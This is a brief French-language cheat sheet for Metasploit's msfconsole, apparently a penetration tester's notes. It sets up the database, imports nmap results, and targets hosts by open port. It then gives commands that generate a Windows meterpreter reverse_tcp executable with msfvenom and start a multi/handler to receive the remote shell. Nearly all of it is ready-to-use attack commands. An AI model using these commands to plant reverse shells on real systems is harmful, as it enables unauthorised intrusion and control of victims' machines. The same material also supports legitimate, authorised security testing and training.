# msfconsole

### Lancer correctement msfconsole

```
# Lancer le service de base de données
sudo service postgresql start

sudo msfconsole
> dbinit
> workspace
> exit
sudo msfconsole
> workspace -a <NAME>
> workspace
> db_import <PATH/TO/NMAP-FILE-*.xml>
```

### Les services

Suite à l'importation de fichiers `nmap`, il est possible de sélectionner uniquement les machines disposant d'un certain service pour y mener une attaque.

```
# Liste les machines disposant du port <PORT> ouvert
services -p <PORT>

# Ajoute les machines avec le port <PORT> ouvert dans la liste des machines à ciblé par les prochaines attaques
services -p <PORT> -R
```

### Créer un _meterpreter_

```
/usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe -o payload.exe
```

### Attendre la connexion d'un _meterpreter_

```
msfconsole
> use exploit/multi/handler
> set payload windows/meterpreter/reverse_tcp
> set LHOST <IP>
> set LPORT <PORT>
> run
```
